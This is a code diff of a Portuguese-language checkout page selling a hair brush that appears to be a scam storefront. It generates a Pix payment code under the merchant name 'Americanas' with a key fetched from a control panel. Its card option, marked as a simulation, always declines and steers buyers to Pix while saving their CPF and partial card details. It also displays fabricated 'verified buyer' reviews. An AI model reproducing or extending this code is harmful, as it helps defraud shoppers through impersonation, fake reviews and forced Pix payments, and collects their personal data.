-            qrPlaceholder.innerHTML = '';
-            new QRCode(qrPlaceholder, { text: payload, width:200, height:200, colorDark:"#000000", colorLight:"#ffffff", correctLevel:QRCode.CorrectLevel.H });
-
-            // Salva pedido
-            const novoPedido = {
-                produto: 'Escova Modeladora 5 em 1',
-                nome: nomeCompleto,
-                valor: valorCompra,
-                cidade: cidade,
-                status: 'pendente',
-                timestamp: Date.now()
-            };
-            const ref = await pedidosRef.push(novoPedido);
-            currentOrderId = ref.key;
-
-            step1.style.display='none';
-            pixScreen.style.display='block';
+        comprarBtn.addEventListener('click',e=>{
+            e.preventDefault();
+            modal.style.display='flex';
+            step1.style.display='block';
+            pixScreen.style.display='none';
             resetPixScreen();
+            entregaSection.style.display='none';
+            emailInput.value=''; primeiroNomeInput.value=''; ultimoNomeInput.value=''; cpfInput.value=''; telefoneInput.value='';
+            cidadeInput.value=''; modalCepInput.value=''; ruaInput.value=''; numeroInput.value='';
+            document.getElementById('complemento').value=''; bairroInput.value=''; ufInput.value='';
+            cardNumber.value=''; cardName.value=''; cardCpf.value=''; cardExpiry.value=''; cardCvv.value='';
+            const cepInicial=document.getElementById('cepInput').value.replace(/\D/g,'');
+            if(cepInicial.length===8) modalCepInput.value=cepInicial;
+            document.getElementById('optionPix').classList.add('selected');
+            document.getElementById('optionCard').classList.remove('selected');
+            document.getElementById('cardForm').classList.remove('show');
+            document.getElementById('pixInfo').style.display='block';
+            atualizarResumo();
+        });
 
-            let totalSeconds=1800;
-            if(timerInterval)clearInterval(timerInterval);
-            timerInterval=setInterval(()=>{
-                if(totalSeconds<=0){
-                    clearInterval(timerInterval);
-                    timerInterval=null;
-                    pixContent.style.display='none';
-                    expiredMessage.style.display='block';
+        closeModal.addEventListener('click',e=>{ e.preventDefault(); modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); });
+        window.addEventListener('click',e=>{ if(e.target===modal){ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); } });
+
+        // ==================== FINALIZAR COMPRA ====================
+        finalizarBtn.addEventListener('click',async e=>{
+            e.preventDefault();
+            if(!checkDadosPessoaisPreenchidos()){ showToast('Preencha todos os dados pessoais.',true); return; }
+            if(!validarEmail(emailInput.value.trim())){ showToast('E-mail inválido.',true); return; }
+            if(!validarCPF(cpfInput.value.trim())){ showToast('CPF inválido.',true); return; }
+            if(!checkEnderecoPreenchido()){ showToast('Preencha todos os dados de endereço.',true); return; }
+
+            const metodo=document.getElementById('optionPix').classList.contains('selected')?'pix':'card';
+            const nomeCompleto=`${primeiroNomeInput.value.trim()} ${ultimoNomeInput.value.trim()}`;
+            const cidade=cidadeInput.value.trim()||'Não informada';
+            const valorCompra=parseFloat(resumoTotal.textContent.replace('R$ ','').replace(',','.'));
+
+            if(metodo==='pix'){
+                finalizarBtn.disabled=true;
+                finalizarBtn.textContent='Gerando PIX...';
+
+                // Busca chave PIX do Firebase
+                const snapshot=await pixKeyRef.once('value');
+                const chave=snapshot.val();
+                if(!chave){
+                    showToast('Chave PIX não configurada no painel.',true);
+                    finalizarBtn.disabled=false;
+                    finalizarBtn.textContent='FINALIZAR COMPRA';
                     return;
                 }
-                totalSeconds--;
-                const mins=Math.floor(totalSeconds/60);
-                const secs=totalSeconds%60;
-                timerEl.textContent=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-            },1000);
 
-            finalizarBtn.disabled=false;
-            finalizarBtn.textContent='FINALIZAR COMPRA';
-        } else {
-            // Cartão (simulação)
-            if(!checkCartaoPreenchido()){ showToast('Preencha todos os dados do cartão.',true); return; }
-            if(!validarCPF(cardCpf.value.trim())){ showToast('CPF do titular inválido.',true); return; }
-            const selectedOption=cardInstallments.options[cardInstallments.selectedIndex];
-            const total=parseFloat(selectedOption.value);
-            const numero=cardNumber.value.replace(/\D/g,'');
-            const ultimos4=numero.slice(-4);
-            const bandeira=numero.startsWith('4')?'Visa':(numero.startsWith('5')?'Mastercard':(numero.startsWith('6')?'Elo':'Desconhecida'));
-            const dadosCartao={ultimos4,bandeira,parcelas:cardInstallments.selectedIndex+1,total,cpf:cardCpf.value.trim()};
-            const novoPedido={
-                produto:'Escova Modeladora 5 em 1',
-                nome:nomeCompleto,
-                valor:total,
-                cidade:cidade,
-                status:'recusado',
-                cartao:dadosCartao,
-                timestamp:Date.now()
-            };
-            pedidosRef.push(novoPedido);
-            showToast('Cartão recusado. Tente novamente com Pix.',true);
-        }
-    });
+                // Gera payload PIX com valor
+                const payload = gerarPayloadPix(chave, valorCompra, 'Americanas', 'RIO DE JANEIRO', '***');
 
-    window.selectPayment = function(method){
-        const optionPix=document.getElementById('optionPix');
-        const optionCard=document.getElementById('optionCard');
-        const cardForm=document.getElementById('cardForm');
-        const pixInfo=document.getElementById('pixInfo');
-        if(method==='pix'){
-            optionPix.classList.add('selected');
-            optionCard.classList.remove('selected');
-            cardForm.classList.remove('show');
-            pixInfo.style.display='block';
-        }else{
-            optionCard.classList.add('selected');
-            optionPix.classList.remove('selected');
-            cardForm.classList.add('show');
-            pixInfo.style.display='none';
-        }
-    };
+                pixKeyElement.innerText = payload;
+                qrPlaceholder.innerHTML = '';
+                new QRCode(qrPlaceholder, { text: payload, width:200, height:200, colorDark:"#000000", colorLight:"#ffffff", correctLevel:QRCode.CorrectLevel.H });
 
-    document.getElementById('copyPixBtn').addEventListener('click',e=>{
-        e.preventDefault();
-        navigator.clipboard.writeText(pixKeyElement.innerText).then(()=>showToast('Código PIX copiado!')).catch(()=>showToast('Pressione Ctrl+C',true));
-    });
+                // Salva pedido
+                const novoPedido = {
+                    produto: 'Escova Modeladora 5 em 1',
+                    nome: nomeCompleto,
+                    valor: valorCompra,
+                    cidade: cidade,
+                    status: 'pendente',
+                    timestamp: Date.now()
+                };
+                const ref = await pedidosRef.push(novoPedido);
+                currentOrderId = ref.key;
 
-    confirmarBtn.addEventListener('click',e=>{
-        e.preventDefault();
-        if(currentOrderId){
-            pedidosRef.child(currentOrderId).update({status:'pago'});
-            setTimeout(()=>{ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); },500);
-        }else{ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); }
-    });
+                step1.style.display='none';
+                pixScreen.style.display='block';
+                resetPixScreen();
 
-    document.getElementById('closeExpiredBtn').addEventListener('click',e=>{ e.preventDefault(); modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); });
+                let totalSeconds=1800;
+                if(timerInterval)clearInterval(timerInterval);
+                timerInterval=setInterval(()=>{
+                    if(totalSeconds<=0){
+                        clearInterval(timerInterval);
+                        timerInterval=null;
+                        pixContent.style.display='none';
+                        expiredMessage.style.display='block';
+                        return;
+                    }
+                    totalSeconds--;
+                    const mins=Math.floor(totalSeconds/60);
+                    const secs=totalSeconds%60;
+                    timerEl.textContent=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+                },1000);
 
-    window.toggleSection = function(header){ const c=header.nextElementSibling; const i=header.querySelector('i'); c.classList.toggle('hidden'); i.classList.toggle('rotate'); };
-    document.getElementById('queroAvaliarBtn')?.addEventListener('click',e=>{ e.preventDefault(); showToast('Função "Quero avaliar" temporária.'); });
-
-    // ==================== AVALIAÇÕES DINÂMICAS ====================
-    const avaliacoes = [
-        { nome:"Carla M.", data:"15/02/2025", texto:"Amei! Meu cabelo ficou super liso e brilhante. A escova esquenta rápido e o cabo giratório ajuda muito.", thumbsUp:24, thumbsDown:1, verificado:true },
-        { nome:"Juliana R.", data:"03/01/2025", texto:"Prodoto excelente, entrega rápida. Fácil de usar e modela muito bem. Recomendo!", thumbsUp:18, thumbsDown:0, verificado:true },
-        { nome:"Patrícia S.", data:"20/12/2024", texto:"Muito boa, mas achei que esquenta um pouco demais no nível 3. Fora isso, é ótima.", thumbsUp:12, thumbsDown:2, verificado:true },
-        { nome:"Fernanda L.", data:"10/11/2024", texto:"Funciona perfeitamente. Meu cabelo é cacheado e ela ajuda a definir sem frizz. Adorei os bicos.", thumbsUp:31, thumbsDown:0, verificado:true },
-        { nome:"Amanda C.", data:"05/10/2024", texto:"Ótimo custo-benefício. Já tive outras escovas e essa superou minhas expectativas.", thumbsUp:15, thumbsDown:1, verificado:true }
-    ];
-    let showAllReviews=false;
-    function renderReviews(){
-        const sortBy=document.getElementById('sortSelect').value;
-        let sorted=[...avaliacoes];
-        if(sortBy==='helpful') sorted.sort((a,b)=>b.thumbsUp-a.thumbsUp);
-        else if(sortBy==='recent') sorted.sort((a,b)=>{ const [aD,aM,aY]=a.data.split('/'); const [bD,bM,bY]=b.data.split('/'); return new Date(bY,bM-1,bD)-new Date(aY,aM-1,aD); });
-        const limit=showAllReviews?sorted.length:3;
-        const reviewsToShow=sorted.slice(0,limit);
-        const container=document.getElementById('reviewsContainer');
-        container.innerHTML='';
-        reviewsToShow.forEach(av=>{
-            const div=document.createElement('div');
-            div.className='qa-item';
-            div.innerHTML=`
-                <div class="qa-question"><i class="fas fa-user"></i> ${av.nome} ${av.verificado?'<span class="verified-badge">comprador verificado</span>':''} <span style="float:right; font-weight:normal;">${av.data}</span></div>
-                <div class="qa-answer">"${av.texto}"</div>
-                <div class="review-helpful"><span><i class="fas fa-thumbs-up"></i> ${av.thumbsUp}</span><span><i class="fas fa-thumbs-down"></i> ${av.thumbsDown}</span><span>esta avaliação foi útil?</span></div>
-            `;
-            container.appendChild(div);
+                finalizarBtn.disabled=false;
+                finalizarBtn.textContent='FINALIZAR COMPRA';
+            } else {
+                // Cartão (simulação)
+                if(!checkCartaoPreenchido()){ showToast('Preencha todos os dados do cartão.',true); return; }
+                if(!validarCPF(cardCpf.value.trim())){ showToast('CPF do titular inválido.',true); return; }
+                const selectedOption=cardInstallments.options[cardInstallments.selectedIndex];
+                const total=parseFloat(selectedOption.value);
+                const numero=cardNumber.value.replace(/\D/g,'');
+                const ultimos4=numero.slice(-4);
+                const bandeira=numero.startsWith('4')?'Visa':(numero.startsWith('5')?'Mastercard':(numero.startsWith('6')?'Elo':'Desconhecida'));
+                const dadosCartao={ultimos4,bandeira,parcelas:cardInstallments.selectedIndex+1,total,cpf:cardCpf.value.trim()};
+                const novoPedido={
+                    produto:'Escova Modeladora 5 em 1',
+                    nome:nomeCompleto,
+                    valor:total,
+                    cidade:cidade,
+                    status:'recusado',
+                    cartao:dadosCartao,
+                    timestamp:Date.now()
+                };
+                pedidosRef.push(novoPedido);
+                showToast('Cartão recusado. Tente novamente com Pix.',true);
+            }
         });
-        const link=document.getElementById('verMaisAvaliacoes');
-        if(avaliacoes.length>3){
-            link.style.display='block';
-            link.textContent=showAllReviews?'Mostrar menos avaliações':'Ver todas as 5 avaliações';
-        }else link.style.display='none';
-    }
-    document.getElementById('sortSelect').addEventListener('change',renderReviews);
-    document.getElementById('verMaisAvaliacoes').addEventListener('click',e=>{ e.preventDefault(); showAllReviews=!showAllReviews; renderReviews(); });
-    renderReviews();
 
-    // ==================== FUNÇÕES AUXILIARES ====================
-    function showToast(msg,err){ const t=document.getElementById('toast'); t.textContent=msg; t.style.backgroundColor=err?'#c62828':'#333'; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),3000); }
-    function validarEmail(email){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); }
-    function validarCPF(cpf){ cpf=cpf.replace(/\D/g,''); if(cpf.length!==11||/^(\d)\1+$/.test(cpf))return false; let s=0,r; for(let i=1;i<=9;i++)s+=parseInt(cpf.charAt(i-1))*(11-i); r=(s*10)%11; if(r===10||r===11)r=0; if(r!==parseInt(cpf.charAt(9)))return false; s=0; for(let i=1;i<=10;i++)s+=parseInt(cpf.charAt(i-1))*(12-i); r=(s*10)%11; if(r===10||r===11)r=0; return r===parseInt(cpf.charAt(10)); }
-</script>
+        window.selectPayment = function(method){
+            const optionPix=document.getElementById('optionPix');
+            const optionCard=document.getElementById('optionCard');
+            const cardForm=document.getElementById('cardForm');
+            const pixInfo=document.getElementById('pixInfo');
+            if(method==='pix'){
+                optionPix.classList.add('selected');
+                optionCard.classList.remove('selected');
+                cardForm.classList.remove('show');
+                pixInfo.style.display='block';
+            }else{
+                optionCard.classList.add('selected');
+                optionPix.classList.remove('selected');
+                cardForm.classList.add('show');
+                pixInfo.style.display='none';
+            }
+        };
+
+        document.getElementById('copyPixBtn').addEventListener('click',e=>{
+            e.preventDefault();
+            navigator.clipboard.writeText(pixKeyElement.innerText).then(()=>showToast('Código PIX copiado!')).catch(()=>showToast('Pressione Ctrl+C',true));
+        });
+
+        confirmarBtn.addEventListener('click',e=>{
+            e.preventDefault();
+            if(currentOrderId){
+                pedidosRef.child(currentOrderId).update({status:'pago'});
+                setTimeout(()=>{ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); },500);
+            }else{ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); }
+        });
+
+        document.getElementById('closeExpiredBtn').addEventListener('click',e=>{ e.preventDefault(); modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); });
+
+        window.toggleSection = function(header){ const c=header.nextElementSibling; const i=header.querySelector('i'); c.classList.toggle('hidden'); i.classList.toggle('rotate'); };
+        document.getElementById('queroAvaliarBtn')?.addEventListener('click',e=>{ e.preventDefault(); showToast('Função "Quero avaliar" temporária.'); });
+
+        // ==================== AVALIAÇÕES DINÂMICAS ====================
+        const avaliacoes = [
+            { nome:"Carla M.", data:"15/02/2025", texto:"Amei! Meu cabelo ficou super liso e brilhante. A escova esquenta rápido e o cabo giratório ajuda muito.", thumbsUp:24, thumbsDown:1, verificado:true },
+            { nome:"Juliana R.", data:"03/01/2025", texto:"Prodoto excelente, entrega rápida. Fácil de usar e modela muito bem. Recomendo!", thumbsUp:18, thumbsDown:0, verificado:true },
+            { nome:"Patrícia S.", data:"20/12/2024", texto:"Muito boa, mas achei que esquenta um pouco demais no nível 3. Fora isso, é ótima.", thumbsUp:12, thumbsDown:2, verificado:true },
+            { nome:"Fernanda L.", data:"10/11/2024", texto:"Funciona perfeitamente. Meu cabelo é cacheado e ela ajuda a definir sem frizz. Adorei os bicos.", thumbsUp:31, thumbsDown:0, verificado:true },
+            { nome:"Amanda C.", data:"05/10/2024", texto:"Ótimo custo-benefício. Já tive outras escovas e essa superou minhas expectativas.", thumbsUp:15, thumbsDown:1, verificado:true }
+        ];
+        let showAllReviews=false;
+        function renderReviews(){
+            const sortBy=document.getElementById('sortSelect').value;
+            let sorted=[...avaliacoes];
+            if(sortBy==='helpful') sorted.sort((a,b)=>b.thumbsUp-a.thumbsUp);
+            else if(sortBy==='recent') sorted.sort((a,b)=>{ const [aD,aM,aY]=a.data.split('/'); const [bD,bM,bY]=b.data.split('/'); return new Date(bY,bM-1,bD)-new Date(aY,aM-1,aD); });
+            const limit=showAllReviews?sorted.length:3;
+            const reviewsToShow=sorted.slice(0,limit);
+            const container=document.getElementById('reviewsContainer');
+            container.innerHTML='';
+            reviewsToShow.forEach(av=>{
+                const div=document.createElement('div');
+                div.className='qa-item';
+                div.innerHTML=`
+                    <div class="qa-question"><i class="fas fa-user"></i> ${av.nome} ${av.verificado?'<span class="verified-badge">comprador verificado</span>':''} <span style="float:right; font-weight:normal;">${av.data}</span></div>
+                    <div class="qa-answer">"${av.texto}"</div>
+                    <div class="review-helpful"><span><i class="fas fa-thumbs-up"></i> ${av.thumbsUp}</span><span><i class="fas fa-thumbs-down"></i> ${av.thumbsDown}</span><span>esta avaliação foi útil?</span></div>
+                `;
+                container.appendChild(div);
+            });
+            const link=document.getElementById('verMaisAvaliacoes');
+            if(avaliacoes.length>3){
+                link.style.display='block';
+                link.textContent=showAllReviews?'Mostrar menos avaliações':'Ver todas as 5 avaliações';
+            }else link.style.display='none';
+        }
+        document.getElementById('sortSelect').addEventListener('change',renderReviews);
+        document.getElementById('verMaisAvaliacoes').addEventListener('click',e=>{ e.preventDefault(); showAllReviews=!showAllReviews; renderReviews(); });
+        renderReviews();
+
+        // ==================== FUNÇÕES AUXILIARES ====================
+        function showToast(msg,err){ const t=document.getElementById('toast'); t.textContent=msg; t.style.backgroundColor=err?'#c62828':'#333'; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),3000); }
+        function validarEmail(email){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); }
+        function validarCPF(cpf){ cpf=cpf.replace(/\D/g,''); if(cpf.length!==11||/^(\d)\1+$/.test(cpf))return false; let s=0,r; for(let i=1;i<=9;i++)s+=parseInt(cpf.charAt(i-1))*(11-i); r=(s*10)%11; if(r===10||r===11)r=0; if(r!==parseInt(cpf.charAt(9)))return false; s=0; for(let i=1;i<=10;i++)s+=parseInt(cpf.charAt(i-1))*(12-i); r=(s*10)%11; if(r===10||r===11)r=0; return r===parseInt(cpf.charAt(10)); }
+
+        // ==================== FUNÇÃO GERAR PAYLOAD PIX ====================
+        function gerarPayloadPix(chave, valor, nome, cidade, txid = '***') {
+            const valorStr = valor.toFixed(2);
+            const nomeStr = nome.substring(0, 25);
+            const cidadeStr = cidade.substring(0, 15);
+            const gui = 'br.gov.bcb.pix';
+            let accountInfo = `0014${gui}01${chave.length.toString().padStart(2, '0')}${chave}`;
+            accountInfo = `${accountInfo.length.toString().padStart(2, '0')}${accountInfo}`;
+            let payload = `00020126${accountInfo}52040000530398654${valorStr.length.toString().padStart(2, '0')}${valorStr}5802BR59${nomeStr.length.toString().padStart(2, '0')}${nomeStr}60${cidadeStr.length.toString().padStart(2, '0')}${cidadeStr}`;
+            const txidField = `05${txid.length.toString().padStart(2, '0')}${txid}`;
+            const additionalData = `${txidField.length.toString().padStart(2, '0')}${txidField}`;
+            payload += `62${additionalData}`;
+            payload += '6304';
+            payload += crc16(payload);
+            return payload;
+        }
+
+        function crc16(str) {
+            let crc = 0xFFFF;
+            for (let i = 0; i < str.length; i++) {
+                crc ^= str.charCodeAt(i) << 8;
+                for (let j = 0; j < 8; j++) {
+                    crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
+                }
+            }
+            crc &= 0xFFFF;
+            return crc.toString(16).toUpperCase().padStart(4, '0');
+        }
+    </script>
 </body>
 </html>
